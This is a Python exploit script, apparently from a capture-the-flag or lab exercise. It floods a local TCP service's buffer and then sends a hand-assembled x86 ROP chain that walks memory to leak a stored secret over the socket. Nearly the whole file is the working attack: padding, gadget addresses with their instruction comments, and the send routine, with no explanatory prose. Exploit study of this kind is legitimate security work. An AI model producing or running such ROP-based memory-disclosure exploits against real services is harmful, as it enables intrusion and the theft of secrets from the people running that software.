#!/usr/bin/env python

from struct import pack
import socket
import sys
import time

from console import console

if len(sys.argv) != 2:
    sys.exit("Usage: %s PORT" % sys.argv[0])

def send_cmd(cmd):
    port = int(sys.argv[1])
    sock = socket.create_connection(('127.0.0.1', port),
                                    socket.getdefaulttimeout(),
                                    ('127.0.0.1', 0))

    sock.sendall("a"*1020)
    time.sleep(1)
    sock.sendall(cmd+"\r\n")

    while True:
        buf = sock.recv(1024)
        if not buf:
            break
        sys.stdout.write(buf)
    sock.close()

#send_cmd("PUT SECRET p455w0rd! Soroush\r\n")

p = ''
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000000) # @ 0
p += pack('<I', 0x080aeca3) # add eax, edx ; ret
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x00000000) # @ .data
p += pack('<I', 0x080831b3) # add ebx, eax ; lea esi, dword ptr [esi] ; xor eax, eax ; ret
# for loop
p += pack('<I', 0x0804834b) # pop edi ; ret
p += pack('<I', 0x00000000) # 
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000000) # @ 0
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x081390a0) # @ .data = 0
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807c7df) # mov esi, edx ; ret
# mov ecx, *secret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139050) # @ .data = for nothing :)
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139ea8) # *secret
p += pack('<I', 0x080a3420) # mov ecx, dword ptr [ecx] ; mov dword ptr [edx], ecx ; ret
# cont. for loop
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0xffffffd0) # @ coming back in stack
p += pack('<I', 0x0808d7c5) # inc edi ; ret
p += pack('<I', 0x0807703f) # inc ecx ; mov ebp, 0xa0b80810 ; ret
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x08127ded) # cmp byte ptr [ecx], al ; ret
p += pack('<I', 0x0809c909) # cmovne eax, edx ; ret
p += pack('<I', 0x080485f4) # pop ebp ; ret
p += pack('<I', 0x00000000) # @ 0
p += pack('<I', 0x0807c05f) # add ebp, eax ; retf
p += pack('<I', 0x0812c918) # add esp, ebp ; add cl, byte ptr [esi] ; adc al, 0x43 ; ret
p += pack('<I', 0x00000073) # cs
# mov ecx, *secret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139050) # @ .data = for nothing :)
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139ea8) # *secret
p += pack('<I', 0x080a3420) # mov ecx, dword ptr [ecx] ; mov dword ptr [edx], ecx ; re
# saving new line in memory
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139090) # @ .data = new Line
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0a0d) # @ new Line
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
# mov edx, edi
p += pack('<I', 0x08082bf0) # mov eax, edi ; pop edi ; ret
p += pack('<I', 0x00000000) # for poping
p += pack('<I', 0x08076ce5) # pop esi ; ret
p += pack('<I', 0x00000000) # for poping
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139050) # @ .data = for keeping ecx
p += pack('<I', 0x080a3422) # mov dword ptr [edx], ecx ; ret
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x00000000) # 0
p += pack('<I', 0x08132728) # add esi, eax ; add ecx, dword ptr [edx] ; ret
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x080481ca) # @ ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x00000000) # 0
p += pack('<I', 0x08127d91) # xor edx, esi ; jmp eax
# write(int fd, const void *buf, size_t count)
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000004) # 0x4
p += pack('<I', 0x08085cbf) # int 0x80
# write(int fd, *0x0a0d, 4)
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000004) # 0x4
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139090) # *newLine
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x00000002) # @ length
p += pack('<I', 0x08085cbf) # int 0x80
# exit
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x00000001) # 0x1
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x00000000) # @ .data
p += pack('<I', 0x08085cbf) # int 0x80

c = 'w'
i = 32
send_cmd(c*i+p)

# :vim set sw=4 ts=8 sts=8 expandtab:
